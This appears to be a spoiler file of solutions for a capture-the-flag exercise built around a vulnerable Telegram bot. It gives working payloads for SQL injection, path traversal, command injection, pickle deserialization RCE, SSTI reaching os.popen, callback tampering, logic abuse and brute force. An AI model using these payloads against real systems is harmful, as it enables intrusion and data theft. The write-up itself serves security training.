# ⚠️ СПОЙЛЕРЫ: разборы

<details><summary>1. SQLi</summary>

```
/search ' UNION SELECT id, name, value FROM secrets --
```
Чтобы найти таблицу: `/search ' UNION SELECT 1, name, sql FROM sqlite_master --`
</details>

<details><summary>2. IDOR</summary>

`/order 1`: бот не проверяет, что заказ твой.
</details>

<details><summary>3. Callback tampering</summary>

У «Золотого флага» кнопка `soldout:3`, но обработчик `buy:<id>:<price>` берёт цену из callback_data.
Отправь callback через userbot (Telethon):
```python
from telethon import TelegramClient
from telethon.tl.functions.messages import GetBotCallbackAnswerRequest
async with TelegramClient("me", API_ID, API_HASH) as c:
    msg = (await c.get_messages("your_bot", limit=1))[0]   # сообщение «Витрина:»
    await c(GetBotCallbackAnswerRequest(peer="your_bot", msg_id=msg.id, data=b"buy:3:0"))
```
</details>

<details><summary>4. Логика</summary>

Проверяется только `amount > balance`. Отрицательный перевод отнимает деньги у получателя:
`/transfer 1 -2000000`, затем `/vip`.
</details>

<details><summary>5. Admin</summary>

Админ определяется по `first_name`. Переименуй себя в Telegram в `Admin` и вызови `/admin`.
Бонус: там же виден промокод.
</details>

<details><summary>6. Path traversal</summary>

`/doc ....//data/secret/flag.txt`: после удаления `../` остаётся `../`.
</details>

<details><summary>7. Command injection</summary>

`/ping 127.0.0.1 | cat cmdi_flag.txt` (также работают `$(...)`, `` `...` `` и `||`).
</details>

<details><summary>8. Pickle RCE</summary>

```python
import pickle, base64
class X:
    def __reduce__(self):
        return (eval, ("{'name': open('data/pickle_flag.txt').read(), 'greeting': ''}",))
print(base64.b64encode(pickle.dumps(X())).decode())
```
`/import <результат>`
</details>

<details><summary>9. SSTI</summary>

`/setgreeting {{ config }}`, затем `/greet`. Шаблон не в песочнице, так что дальше возможен и RCE:
`{{ cycler.__init__.__globals__.os.popen('id').read() }}`
</details>

<details><summary>10. Debug</summary>

Сломай что угодно, например `/order abc`. Обработчик ошибок выдаст traceback и `DEBUG_INFO`.
</details>

<details><summary>11. Brute force</summary>

Код из трёх цифр, лимита нет. Перебери `/promo 000`…`999` через userbot
(с паузами, чтобы Telegram не дал FloodWait) или подсмотри код в `/admin`.
</details>
